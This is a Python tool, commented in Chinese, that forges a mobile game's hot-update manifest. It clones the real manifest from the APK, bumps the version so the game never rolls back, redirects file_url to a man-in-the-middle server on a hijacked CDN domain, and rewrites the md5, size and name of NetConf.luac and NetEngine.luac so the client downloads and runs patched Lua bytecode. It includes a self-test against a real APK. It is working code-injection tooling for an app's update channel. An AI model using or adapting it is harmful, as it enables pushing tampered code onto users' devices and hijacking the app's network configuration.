"""manifest_forge.py — 克隆真实 Lobby project.manifest，伪造成「只改 NetConf.luac 一条」。

逆向结论见 .trellis/tasks/06-14-srs-addr-hijack/research/hotfix-download-verify.md：

- 热更通用（非 zip）下载路径：CDN 在 `file_url + name` 原样返回 luac 字节 → 下载器按
  file_list[k]["md5"] 校验 → 原样改名进 rootPath（**无 gunzip/unzip**）。
  ∴ file_list 里的 md5 = md5(最终落盘 luac 字节)，size = len(luac 字节)。
- genDiffList 只对「md5 与本地不同」的条目产生下载任务。故只改 NetConf 一条 md5，
  其余 914 条原样 → diff 只剩 NetConf 一个文件。
- version 顶高（逐段数字比较）→ 游戏永远认为有新版本（设置期）且之后永不回滚。
- forbid_zip=true + 不带 diff_zip/zip_url → 强制走通用逐文件下载，规避压缩包路径。

⚠ md5 算法的唯一未 100% 确定点：CDN 对 .luac 是否返回 gzip 且引擎 gunzip。逆向判定「否」
  （通用路径无解压）。若真机抓包发现是 gzip，把 `_md5/_size` 改成对 gzip 字节算、并让
  setup_mitm serve gzip 字节即可（served_netconf_bytes 传 gzip 后的字节）。

纯离线工具，不依赖运行时，不碰 vpn/hotspot/noconfig 现有端点。
"""
from __future__ import annotations

import copy
import hashlib
import json
import zipfile
from dataclasses import dataclass, field

# APK 内真实 Lobby manifest 落点（克隆源）
APK_LOBBY_MANIFEST_ENTRY = "assets/res/GameHotUpdate3/Lobby/project_10001.manifest"

# file_list 里 NetConf 的 key（注意：是小写 config，与 APK 实体路径 Config 大小写不同）
NETCONF_FILE_KEY = "src/app/config/NetConf.luac"
# NetEngine.luac key 在 manifest 里大小写按 case-insensitive 命中，但通用约定是小写 net
NETENGINE_FILE_KEY = "src/app/net/NetEngine.luac"

# 默认顶高的伪版本号（逐段数字 < 比较，远超官方 1.0.0.x）
DEFAULT_BUMP_VERSION = "9.9.9.103"


def _md5(data: bytes) -> str:
    return hashlib.md5(data).hexdigest()


def _served_name(md5_hex: str) -> str:
    """按 md5 派生 CDN name：<前2hex>/<md5全>.luac（自洽、便于 server 路由）。"""
    return f"{md5_hex[:2]}/{md5_hex}.luac"


def discover_file_key_by_basename(basename: str, manifest: dict) -> str | None:
    """在 manifest['file_list'] 里 case-insensitive 找到第一个文件名 == basename 的 key。

    返回保留**原始大小写**的 key（供 forge 时原地改写）。找不到返回 None。
    线上 manifest 的某些 key 大小写与 APK 内置可能不同（如 `Config` vs `config`、
    `Net` vs `net`），调用方应优先用此函数动态发现实际 key 而非硬编码常量。
    """
    file_list = manifest.get("file_list")
    if not isinstance(file_list, dict):
        return None
    want = basename.lower()
    for key in file_list:
        if key.rsplit("/", 1)[-1].lower() == want:
            return key
    return None


@dataclass
class ForgeResult:
    manifest_json_bytes: bytes  # 伪造的完整 project.manifest（UTF-8 JSON 字节）
    served_name: str            # NetConf 在 file_url 下的相对路径（server 据此路由）
    served_md5: str             # = md5(served_netconf_bytes)
    served_size: int            # = len(served_netconf_bytes)
    version: str                # 顶高后的版本号
    file_count: int             # file_list 条目数（应与原始一致）


@dataclass
class MultiForgeResult:
    """多文件下发结果：每个文件的 served_name/md5/size 单独可查。"""
    manifest_json_bytes: bytes
    version: str
    file_count: int
    # key=manifest 里的 file_list 键；value=该文件的 (served_name, md5_hex, size)
    served: dict[str, tuple[str, str, int]] = field(default_factory=dict)


def load_manifest_from_file(manifest_path: str) -> dict:
    with open(manifest_path, "rb") as f:
        raw = f.read()
    return json.loads(raw.decode("utf-8"))


def load_real_manifest(apk_path: str) -> dict:
    with zipfile.ZipFile(apk_path) as z:
        raw = z.read(APK_LOBBY_MANIFEST_ENTRY)
    return json.loads(raw.decode("utf-8"))


def forge_manifest(
    apk_path: str,
    served_netconf_bytes: bytes,
    ecs_self_base_url: str,
    *,
    bump_version: str = DEFAULT_BUMP_VERSION,
    netconf_key: str = NETCONF_FILE_KEY,
) -> tuple[bytes, str]:
    """克隆真实 manifest → 顶高版本 + 只替换 NetConf 一条 → (manifest_json_bytes, served_name)。

    ecs_self_base_url: 我们 MITM HTTP 服务的 file_url 基址（NetConf 从这里下），如
        "https://gxb-oss.hzxuanming.com/yj/files/"（DNS 已被劫持到 PC，CN 随便）。
        manifest 的 update_url/manifest_url 由 setup_mitm 另行指定，本函数只设 file_url。
    返回 (manifest_json_bytes, served_name)，served_name 为 NetConf 在 file_url 下的相对路径。
    """
    res = forge_manifest_full(
        apk_path, served_netconf_bytes, ecs_self_base_url,
        bump_version=bump_version, netconf_key=netconf_key,
    )
    return res.manifest_json_bytes, res.served_name


def forge_manifest_full_from_file(
    manifest_path: str,
    served_netconf_bytes: bytes,
    ecs_self_base_url: str,
    *,
    bump_version: str = DEFAULT_BUMP_VERSION,
    netconf_key: str = NETCONF_FILE_KEY,
) -> ForgeResult:
    """同 forge_manifest_full，但从独立 manifest JSON 文件加载（无需 APK）。"""
    manifest = load_manifest_from_file(manifest_path)
    forged = copy.deepcopy(manifest)

    file_list = forged.get("file_list")
    if not isinstance(file_list, dict) or netconf_key not in file_list:
        raise KeyError(f"真实 manifest 缺少 NetConf 条目 {netconf_key!r}")

    forged["version"] = bump_version
    if not ecs_self_base_url.endswith("/"):
        ecs_self_base_url += "/"
    forged["file_url"] = [ecs_self_base_url]
    forged["forbid_zip"] = True
    forged.pop("diff_zip", None)
    forged.pop("zip_url", None)

    md5_hex = _md5(served_netconf_bytes)
    size = len(served_netconf_bytes)
    served_name = _served_name(md5_hex)
    entry = dict(file_list[netconf_key])
    entry["md5"] = md5_hex
    entry["size"] = size
    entry["name"] = served_name
    file_list[netconf_key] = entry

    manifest_json_bytes = json.dumps(forged, ensure_ascii=False).encode("utf-8")

    return ForgeResult(
        manifest_json_bytes=manifest_json_bytes,
        served_name=served_name,
        served_md5=md5_hex,
        served_size=size,
        version=bump_version,
        file_count=len(file_list),
    )


def forge_manifest_full(
    apk_path: str,
    served_netconf_bytes: bytes,
    ecs_self_base_url: str,
    *,
    bump_version: str = DEFAULT_BUMP_VERSION,
    netconf_key: str = NETCONF_FILE_KEY,
) -> ForgeResult:
    """同 forge_manifest，但返回带校验字段的 ForgeResult（供自测/server 用）。"""
    manifest = load_real_manifest(apk_path)
    forged = copy.deepcopy(manifest)

    file_list = forged.get("file_list")
    if not isinstance(file_list, dict) or netconf_key not in file_list:
        raise KeyError(f"真实 manifest 缺少 NetConf 条目 {netconf_key!r}")

    # ① 版本顶高
    forged["version"] = bump_version

    # ② file_url 指向我们的服务（NetConf 从这里下）
    if not ecs_self_base_url.endswith("/"):
        ecs_self_base_url += "/"
    forged["file_url"] = [ecs_self_base_url]

    # ③ 强制通用下载路径，规避 zip 差分/整包压缩
    forged["forbid_zip"] = True
    forged.pop("diff_zip", None)
    forged.pop("zip_url", None)

    # ④ 只改 NetConf 一条：md5/size/name 指向我们要投递的字节
    md5_hex = _md5(served_netconf_bytes)
    size = len(served_netconf_bytes)
    served_name = _served_name(md5_hex)
    entry = dict(file_list[netconf_key])  # 保留原条目其它字段（若有）
    entry["md5"] = md5_hex
    entry["size"] = size
    entry["name"] = served_name
    file_list[netconf_key] = entry

    manifest_json_bytes = json.dumps(forged, ensure_ascii=False).encode("utf-8")

    return ForgeResult(
        manifest_json_bytes=manifest_json_bytes,
        served_name=served_name,
        served_md5=md5_hex,
        served_size=size,
        version=bump_version,
        file_count=len(file_list),
    )


def forge_manifest_multi(
    apk_path: str,
    files: dict[str, bytes],
    ecs_self_base_url: str,
    *,
    bump_version: str = DEFAULT_BUMP_VERSION,
) -> MultiForgeResult:
    """多文件版伪造：files = { manifest_key: served_bytes } → 同时改写多条 file_list 条目。

    Path Y(ECS 故障兜底) 用法：同时下发 NetConf.luac 与 NetEngine.luac 两个 patched luac，
    游戏 genDiffList 只 diff 出这两条 md5 不同 → 只下载它俩 → 一次热更同时注入。

    ecs_self_base_url: file_url 基址；每个 served_name 都从这里下载。
    files 的 key 大小写必须与线上 manifest 一致（建议调用方先用
    `discover_file_key_by_basename` 在线上 manifest 里命中实际 key）。

    Lobby APK manifest 通常不含 NetEngine 条目（NetEngine 走 base APK 而非 Lobby 热更包），
    若某 key 不存在则抛 KeyError——调用方需把 NetEngine 的下发挂到正确 manifest（base
    project.manifest 或 setup_mitm 的回源 patcher）。本函数仅负责按给定 manifest 改写
    已存在的 keys。
    """
    manifest = load_real_manifest(apk_path)
    forged = copy.deepcopy(manifest)
    file_list = forged.get("file_list")
    if not isinstance(file_list, dict):
        raise KeyError("真实 manifest 缺少 file_list")

    missing = [k for k in files if k not in file_list]
    if missing:
        raise KeyError(f"真实 manifest 缺少这些 key: {missing}")

    # ① 版本顶高
    forged["version"] = bump_version

    # ② file_url 指向我们的服务
    if not ecs_self_base_url.endswith("/"):
        ecs_self_base_url += "/"
    forged["file_url"] = [ecs_self_base_url]

    # ③ 强制通用下载路径
    forged["forbid_zip"] = True
    forged.pop("diff_zip", None)
    forged.pop("zip_url", None)

    # ④ 改写每个文件条目
    served: dict[str, tuple[str, str, int]] = {}
    for key, body in files.items():
        md5_hex = _md5(body)
        size = len(body)
        name = _served_name(md5_hex)
        entry = dict(file_list[key])
        entry["md5"] = md5_hex
        entry["size"] = size
        entry["name"] = name
        file_list[key] = entry
        served[key] = (name, md5_hex, size)

    manifest_json_bytes = json.dumps(forged, ensure_ascii=False).encode("utf-8")

    return MultiForgeResult(
        manifest_json_bytes=manifest_json_bytes,
        version=bump_version,
        file_count=len(file_list),
        served=served,
    )


def _selftest() -> None:
    """离线自测：断言 version 顶高、只有改写条目变化、md5==md5(served)。"""
    import os

    apk = os.path.join(os.path.dirname(__file__), "..", "..", "..", "apk", "game_base.apk")
    apk = os.path.abspath(apk)

    real = load_real_manifest(apk)
    real_fl = real["file_list"]

    # ── 1) 单文件向后兼容 ────────────────────────────────────────────────
    served = b"devaguopeifei" + b"\x11\x22\x33\x44" * 100  # 假装是改过的 luac
    res = forge_manifest_full(apk, served, "https://gxb-oss.hzxuanming.com/yj/files/")
    forged = json.loads(res.manifest_json_bytes.decode("utf-8"))
    forged_fl = forged["file_list"]

    assert forged["version"] == DEFAULT_BUMP_VERSION, forged["version"]
    assert real["version"] != DEFAULT_BUMP_VERSION
    print(f"[OK] version: {real['version']} -> {forged['version']}")

    assert forged["forbid_zip"] is True
    assert "diff_zip" not in forged and "zip_url" not in forged
    print("[OK] forbid_zip=True, diff_zip/zip_url removed")

    assert len(forged_fl) == len(real_fl), (len(forged_fl), len(real_fl))
    print(f"[OK] file_list size unchanged: {len(forged_fl)}")

    changed = [k for k in real_fl if real_fl[k] != forged_fl.get(k)]
    assert changed == [NETCONF_FILE_KEY], changed
    print(f"[OK] only changed entry: {changed}")

    nc = forged_fl[NETCONF_FILE_KEY]
    assert nc["md5"] == _md5(served), nc["md5"]
    assert nc["size"] == len(served)
    assert nc["name"] == res.served_name == _served_name(_md5(served))
    print(f"[OK] NetConf entry: md5={nc['md5']} size={nc['size']} name={nc['name']}")

    assert forged["file_url"] == ["https://gxb-oss.hzxuanming.com/yj/files/"]
    print(f"[OK] file_url={forged['file_url']}")

    mb, sn = forge_manifest(apk, served, "https://gxb-oss.hzxuanming.com/yj/files/")
    assert json.loads(mb) == forged and sn == res.served_name
    print("[OK] forge_manifest() thin wrapper consistent")

    # ── 2) 多文件 forge_manifest_multi (Path Y) ──────────────────────────
    # 在 Lobby manifest 里挑两个真实存在的 key（NetConf + 任意一条同包条目）
    # 来证明多 key 改写工作。NetEngine 不在 Lobby 包里，跳过它的 key 不在场景测试。
    # 找出 Lobby manifest 里的另一条 luac 条目作为占位 (NetEngine 的同包代替)。
    other_key = next(
        (k for k in real_fl if k != NETCONF_FILE_KEY and k.endswith(".luac")),
        None,
    )
    assert other_key, "Lobby manifest must contain at least one other .luac key"

    nc_bytes = b"devaguopeifei" + b"\xaa" * 100
    other_bytes = b"devaguopeifei" + b"\xbb" * 200
    multi = forge_manifest_multi(
        apk,
        {NETCONF_FILE_KEY: nc_bytes, other_key: other_bytes},
        "https://gxb-oss.hzxuanming.com/yj/files/",
    )
    multi_fl = json.loads(multi.manifest_json_bytes.decode("utf-8"))["file_list"]

    assert NETCONF_FILE_KEY in multi.served and other_key in multi.served
    nc_name, nc_md5, nc_size = multi.served[NETCONF_FILE_KEY]
    other_name, other_md5, other_size = multi.served[other_key]
    assert nc_md5 == _md5(nc_bytes) and nc_size == len(nc_bytes)
    assert other_md5 == _md5(other_bytes) and other_size == len(other_bytes)
    # served md5/size/name 与 manifest 里写入的条目一致
    assert multi_fl[NETCONF_FILE_KEY]["md5"] == nc_md5
    assert multi_fl[NETCONF_FILE_KEY]["size"] == nc_size
    assert multi_fl[NETCONF_FILE_KEY]["name"] == nc_name
    assert multi_fl[other_key]["md5"] == other_md5
    assert multi_fl[other_key]["size"] == other_size
    assert multi_fl[other_key]["name"] == other_name
    # file_count 不变（多文件改写不删条目）
    assert multi.file_count == len(real_fl), (multi.file_count, len(real_fl))
    print(f"[OK] forge_manifest_multi: changed {len(multi.served)} entries "
          f"({NETCONF_FILE_KEY}, {other_key}); md5/size/name consistent with served bytes")

    # 缺 key 应抛 KeyError
    try:
        forge_manifest_multi(
            apk,
            {"src/does/not/exist.luac": b"x"},
            "https://gxb-oss.hzxuanming.com/yj/files/",
        )
    except KeyError:
        print("[OK] forge_manifest_multi raises KeyError for missing keys")
    else:
        raise AssertionError("forge_manifest_multi should raise on missing key")

    # ── 3) discover_file_key_by_basename ─────────────────────────────────
    found = discover_file_key_by_basename("NetConf.luac", real)
    assert found == NETCONF_FILE_KEY, found
    miss = discover_file_key_by_basename("NoSuchFile.luac", real)
    assert miss is None
    print(f"[OK] discover_file_key_by_basename('NetConf.luac') -> {found}")

    print("\n[PASS] manifest_forge offline selftest passed")


if __name__ == "__main__":
    _selftest()
